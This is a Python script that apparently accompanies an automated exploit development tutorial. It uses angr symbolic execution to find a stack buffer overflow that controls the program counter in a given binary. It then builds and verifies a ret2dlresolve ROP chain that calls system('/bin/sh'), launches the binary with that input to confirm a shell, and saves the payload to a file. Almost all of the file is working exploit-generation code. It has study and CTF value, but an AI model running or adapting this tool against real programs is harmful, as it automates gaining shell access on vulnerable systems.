#!/usr/bin/env python
import angr
import argparse
import claripy
import logging
import os

logging.basicConfig()
from pwn import *
log = logging.getLogger(__name__)
log.setLevel(logging.INFO)

logging.getLogger("pwnlib.rop.ret2dlresolve").disabled = True
logging.getLogger("angr.engines.successors").disabled = True
logging.getLogger("angr.storage.memory_mixins.default_filler_mixin").disabled = True
logging.getLogger("pwnlib").disabled = True

input_buffer_file = "./pwn_input"

class read_hook(angr.procedures.posix.read.read):
    
    def run(self, fd, dst, length):
        
        conc_len = self.state.solver.eval(length)
        log.info("Got read of length : {}".format(conc_len))

        if 'read_lengths' not in self.state.globals.keys():
            self.state.globals['read_lengths'] = []
        self.state.globals['read_lengths'].append(conc_len)

        return super(read_hook,self).run(fd, dst, length)

"""
Generate a rop chain that calls
execve("/bin/sh",NULL,NULL) for the
given binary
"""
def generate_dlresolve_rop_chain(binary_path, dlresolve):
    context.binary = binary_path
    elf = ELF(binary_path)
    rop = ROP(elf)

    rop.read(0, dlresolve.data_addr)
    # rop.read(0, dlresolve.data_addr, len(dlresolve.payload))

    rop.ret2dlresolve(dlresolve)

    log.info("rop chain gadgets and values:\n{}".format(rop.dump()))

    """
    We need both the generated chain and gadget addresses for when
    we contrain theprogram state to execute and constrain this chain,
    so we pass back both the rop tools refernce along with the chain.
    """
    return rop, rop.build()

def fix_gadget_registers(gadget):
    if gadget.regs != []:
        return gadget
    log.debug("Fixing gadget : {}".format(gadget))
    for insn in gadget.insns:
        if "pop" in insn:
            # Splt a 'pop eax' or 'pop rdx' to get register name
            gadget.regs.append(insn.split(" ")[-1])
    return gadget

def get_debug_stack(state, depth=8, rop=None):
    register_size = int(state.arch.bits / 8)
    curr_sp = state.solver.eval(state.regs.sp)

    dbg_lines = ["Current Stack Pointer : {}".format(hex(curr_sp))]

    curr_sp -= (depth * register_size)

    for i in range(depth+4):
        address = curr_sp + (i*register_size)
        val = state.memory.load(address, register_size)
        concrete_vaue = 0
        desc = ""
        concrete_vaue = state.solver.eval(val,cast_to=bytes)
        concrete_vaue = u64(concrete_vaue)
        desc = state.project.loader.describe_addr(concrete_vaue)
        if rop and concrete_vaue in rop.gadgets:
            rop_gadget = rop.gadgets[concrete_vaue]
            desc += "\n\t"
            desc += "\n\t".join(rop_gadget.insns)
        if "not part of a loaded object" in desc:
            desc = ""
        dbg_line = "{:18} | {:18} - {}".format(hex(address),hex(concrete_vaue), desc)
        dbg_lines.append(dbg_line)
    
    return "\n".join(dbg_lines)

def plt_call_hook(state, gadget_addr):
    '''
    Emulating the following instructions:
    push    qword ptr [rip + 0x2fe2]
    bnd jmp    qword ptr [rip + 0x2fe3]
    '''
    log.info("Emulating plt call hook")
    p2 = angr.Project(state.project.filename, auto_load_libs=False)
    CFG = p2.analyses.CFG()

    pc_block = CFG.model.get_any_node(gadget_addr).block
    for insn in pc_block.capstone.insns:
        log.info(insn)
        rip_addr = insn.address
        rip_offset = insn.disp
        if insn.mnemonic == "push":
            ret_val = rip_addr + rip_offset + insn.size
            log.info("Emulating stack push with value : {}".format(hex(ret_val)))
            state.stack_push(ret_val)
        elif "jmp" in insn.mnemonic:
            pc_val = rip_addr + rip_offset + insn.size
            log.info("Emulating plt jmp with value : {}".format(hex(pc_val)))
            # Emulating a 'bnd jmp'
            # the bnd part is pretty much just a nop
            state.regs.pc = pc_val

"""
There are two main ways we can generate and verify a rop chain, if 
we assume that our gadgets might not be right next to each other
on the stack, then we want to emulate and step through each piece of
our ropchain and contrain each address or register to the expected 
value
"""
def do_64bit_rop_with_stepping(elf, rop, rop_chain, new_state, dlresolve):
    user_input = new_state.globals["user_input"]
    curr_rop = None
    elf_symbol_addrs = [y for x, y in elf.symbols.items()]
    p = new_state.project

    """
    We are going to iterate over gadgets or values set in the
    chain to apply constraints to either the program counter
    or pushed/poped register
    """
    for i, gadget in enumerate(rop_chain):

        """
        We generally have two constraining mode:
        1. running a code gadget
        2. setting a register
        """
        if gadget in rop.gadgets:
            curr_rop = rop.gadgets[gadget]

            curr_rop = fix_gadget_registers(curr_rop)

            # reversing it lets us pop values out easy
            curr_rop.regs.reverse()

        """
        Case 1. Running a code gadget.
        We keep track of the number of registers our gadget
        popped, and if it's 0, then we're just executing.
        """
        if curr_rop is None or gadget in rop.gadgets or len(curr_rop.regs) == 0:

            if new_state.satisfiable(extra_constraints=([new_state.regs.pc == gadget])):
                """
                For the actual ROP gadgets, we're stepping through them
                until we hit an unconstrained value - We did a `ret` back
                onto the symbolic stack.
                This process is slower than just setting the whole stack
                to the chain, but in testing it seems to work more reliably
                """
                log.debug("Setting PC to {}".format(hex(gadget)))
                new_state.add_constraints(new_state.regs.pc == gadget)

                """
                Since we're emulating the program's execution with angr we
                will run into an issue when executing any symbols. Where a
                SimProcedure will get executed instead of the real function,
                which then gives us the wrong constraints/execution for our
                rop_chain
                """
                if gadget in elf_symbol_addrs:
                    log.debug(
                        "gadget is hooked symbol, contraining to real address, but calling SimProc"
                    )
                    symbol = [x for x in elf.symbols.items() if gadget == x[1]][0]
                    new_state.regs.pc = p.loader.find_symbol(symbol[0]).rebased_addr

                """
                There is no point in letting our last gadget run, we have all
                the constraints on our input to trigger the leak
                """
                if i == len(rop_chain) - 1:
                    break

                # Are we in the .plt about to execute our dlresolv payload?
                if p.loader.find_section_containing(gadget).name == '.plt':
                    '''
                    We're expecting a:
                    push qword [0x004040008] # .plt section
                    jmp qword [0x00404010] # .plt section + 0x8
                    or
                    401020  push    qword ptr [0x404008]
                    401026  bnd jmp qword ptr [0x404010]
                    which we can emulate
                    '''
                    # load the memory region and constrain it
                    # We already called read that returned a symbolic read value
                    # into the section we're about to use

                    dlresolv_payload_memory = new_state.memory.load(dlresolve.data_addr,len(dlresolve.payload))
                    if new_state.satisfiable(extra_constraints=([dlresolv_payload_memory == dlresolve.payload])):
                        new_state.add_constraints(dlresolv_payload_memory == dlresolve.payload)
                        log.debug("Values written to address at : {}".format(hex(dlresolve.data_addr)))
                    else:
                        log.info("Could not set dlresolve payload to address : {}".format(hex(dlresolve.data_addr)))
                        return None, None

                    dlresolv_index = new_state.memory.load(new_state.regs.sp,8)

                    dlresolve_bytes = p64(rop_chain[i+1])
                    if new_state.satisfiable(extra_constraints=([dlresolv_index == dlresolve_bytes])):
                        new_state.add_constraints(dlresolv_index == dlresolve_bytes)
                        log.debug("Set dlresolv index value to : {}".format(hex(rop_chain[i+1])))

                    plt_call_hook(new_state, gadget)

                    rop_simgr = new_state.project.factory.simgr(new_state)

                    # We just need one step into our payload
                    rop_simgr.step()

                    stack_vals = get_debug_stack(new_state, depth=9, rop=rop)
                    log.info(stack_vals)
                    
                    if len(rop_simgr.errored):
                        log.error("Bad Address : {}".format(hex(dlresolve.data_addr)))
                        return None, None

                    new_state = rop_simgr.active[0]
                    new_state.globals['dlresolve_payload'] = dlresolve.payload
                    log.info("Found address : {}".format(hex(dlresolve.data_addr)))
                    log.info(rop_simgr)
                    break

                """
                Since we're stepping through a ROP chain, VEX IR wants to
                try and lift the whole block and emulate a whole block step
                this will break what we're trying to do, so we need to
                tell it to try and emulate single-step execution as closely
                as we can with the opt_level=0    
                """
                rop_simgr = new_state.project.factory.simgr(new_state)
                rop_simgr.explore(opt_level=0)
                new_state = rop_simgr.unconstrained[0]

                # We already set the dlresolv index value, don't try to execute
                # the next piece
                if p.loader.find_section_containing(gadget).name == '.plt':
                    break

            else:
                log.error("unsatisfied on {}".format(hex(gadget)))
                break

        else:
            """
            Case 2: We're setting a register to an expected popped value

            Usually for 64bit rop chains, we're passing values into
            the argument registers like RDI, so this only covers RDI
            since the auto-rop chain is pretty simple, but we would
            extend this portion to cover all register sets from POP
            calls
            """
            next_reg = curr_rop.regs.pop()
            log.debug("Setting register : {}".format(next_reg))

            gadget_msg = gadget
            if isinstance(gadget,bytes):
                gadget = u64(gadget)
            if isinstance(gadget, int):
                gadget_msg = hex(gadget)


            state_reg = getattr(new_state.regs, next_reg)
            if state_reg.symbolic and new_state.satisfiable(
                extra_constraints=([state_reg == gadget])
            ):

                log.debug("Setting {} to {}".format(next_reg, gadget_msg))

                new_state.add_constraints(state_reg == gadget)
            else:
                log.error("unsatisfied on {} -> {}".format(next_reg, gadget_msg))
                break

            if len(curr_rop.regs) == 0:
                curr_rop = None
    return user_input, new_state

def validate_inputs(pwn_state, interact=False, rop_chain_bytes=None):

    if rop_chain_bytes is None:
        rop_chain_bytes = pwn_state.posix.dumps(0)

    # This binary calls gets() and then we rop to read()
    # We need to split our input sending accordingly
    payload_index = rop_chain_bytes.index(pwn_state.globals['dlresolve_payload'])

    # path.libc.max_gets_size contains the max gets() size
    # but we might as well just index incase angr changes it's default
    # behavior
    first_input = rop_chain_bytes[:payload_index]

    second_input_len = pwn_state.globals['read_lengths'][0]
    # We could then split this up per state.globals['read_lengths'], 
    # but we only have one read in this example
    second_input = rop_chain_bytes[payload_index:payload_index + second_input_len]

    log.info("\tFirst binary input :\n{}".format(first_input))
    log.info("\tSecond binary input :\n{}".format(second_input))

    p = process(pwn_state.project.filename)

    p.send(first_input)

    p.send(second_input)

    if interact:
        p.interactive()
    else:

        # If we have a shell we can send a bunch of new lines
        try:
            for _ in range(10):
                p.sendline("ls")
                p.clean()
        except EOFError as e:
            log.info("EOF Error")
            p.proc.terminate()
            return False

    log.info("We good!")
    return True

def get_rop_chain(state):

    """
    We're using a copy of the original state since we are applying
    constraints one at a time and stepping through the state.
    """
    state_copy = state.copy()

    binary_name = state.project.filename

    context.binary = pwntools_elf = ELF(binary_name)

    '''
    For non-pie binaries we know that our writeable/readable segments
    are limited:
    '''
    p = state_copy.project
    addr_ranges = []

    # Try pwntools' reccomended ranges:
    default_addr = Ret2dlresolvePayload(pwntools_elf, symbol="system", args=["/bin/sh"])._get_recommended_address()

    default_range = (default_addr, default_addr+0xF0)
    addr_ranges.append(default_range)

    # Try all the R/W segments
    for segment in p.loader.main_object.segments:
        if segment.is_writable and segment.is_readable:
            log.info("Trying segment : {}".format(segment))
            log.info("{} -> {}".format(hex(segment.vaddr), hex(segment.max_addr)))
            segment_range = (segment.vaddr, segment.max_addr)
            addr_ranges.append(segment_range)

    # Also try the bss section
    bss_range = (pwntools_elf.bss(0x700),pwntools_elf.bss(0xFF0))
    addr_ranges.append(bss_range)
    addr_found = False

    '''
    We need to test a number of addresses to see if they will
    work to hold our dlresolv payload. The elf.bss() address
    is a good candidate to test.
    '''
    for addr_range in addr_ranges:
        if addr_found:
            break
        min_range = addr_range[0]
        max_range = addr_range[1]
        log.info("Trying range {} -> {}".format(min_range, max_range))
        for i in range(min_range,max_range,0x8):
            log.info("Testing address : {}".format(hex(i)))
            
            dlresolve = Ret2dlresolvePayload(pwntools_elf, symbol="system", args=["/bin/sh"], data_addr=i)
            """
            Here we're getting the ropchain bytes and rop chain object
            that has the individual gadget addresses and values
            """
            rop_object, rop_chain = generate_dlresolve_rop_chain(binary_name, dlresolve)

            """
            Here we're running through the program state and setting
            each gadget.
            """
            user_input, new_state = do_64bit_rop_with_stepping(
                pwntools_elf, rop_object, rop_chain, state_copy, dlresolve
            )

            if user_input != None and validate_inputs(new_state):
                addr_found = True
                break

    # Get all the read lengths out of here
    state.globals['read_lengths'] = new_state.globals['read_lengths']
    state.globals['dlresolve_payload'] = new_state.globals['dlresolve_payload']

    """
    With our constraints set, our binary's STDIN
    should now contain our entire overflow + ropchain!
    """
    input_bytes = new_state.posix.dumps(0)

    return input_bytes


# https://breaking-bits.gitbook.io/breaking-bits/vulnerability-discovery/automated-exploit-development/buffer-overflows
def check_mem_corruption(simgr):

    # Check for unconstrainted state where we control the
    # program counterelf
    for state in simgr.unconstrained:
        if state.satisfiable(extra_constraints=[state.regs.pc == b"CCCCCCCC"]):

            # Here we know we can arbitrarily set the program counter,
            # so now we want to set it to a ropchain we generate for the
            # program
            pc_overwrite = state.posix.dumps(
                0, extra_constraints=[state.regs.pc == b"CCCCCCCC"]
            )
            log.info("We can overwrite the PC with : {}".format(pc_overwrite))
            log.info(
                "PC overwrite starts at : {}".format(pc_overwrite.index(b"CCCCCCCC"))
            )

            rop_chain_bytes = get_rop_chain(state)
            log.info("We can run our ropchain with : {}".format(rop_chain_bytes))

            if state.satisfiable():
                state.globals["rop_chain_bytes"] = rop_chain_bytes
                simgr.stashes["mem_corrupt"].append(state)

            simgr.stashes["unconstrained"].remove(state)
            simgr.drop(stash="active")
    return simgr


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("Binary")

    args = parser.parse_args()

    input_arg = claripy.BVS("input", 400 * 8)

    p = angr.Project(args.Binary)
    state = p.factory.full_init_state(
        stdin=input_arg,
        env=os.environ,
    )

    p.hook_symbol("read", read_hook())

    state.libc.buf_symbolic_bytes = 0x100
    state.globals["user_input"] = input_arg

    simgr = p.factory.simgr(state, save_unconstrained=True)
    simgr.stashes["mem_corrupt"] = []

    simgr.explore(step_func=check_mem_corruption)

    """
    Write rop chain out to a file
    """
    if "mem_corrupt" in simgr.stashes:
        pwn_state = simgr.stashes["mem_corrupt"][0]
        rop_chain_bytes = pwn_state.globals["rop_chain_bytes"]
        with open(input_buffer_file, "wb") as f:
            f.write(rop_chain_bytes)
        log.info("Wrote rop chain to file : {}".format(input_buffer_file))

    validate_inputs(pwn_state, rop_chain_bytes=rop_chain_bytes, interact=True)

    log.info("Try running : cat {} - | ./{}".format(input_buffer_file, args.Binary))


if __name__ == "__main__":
    main()
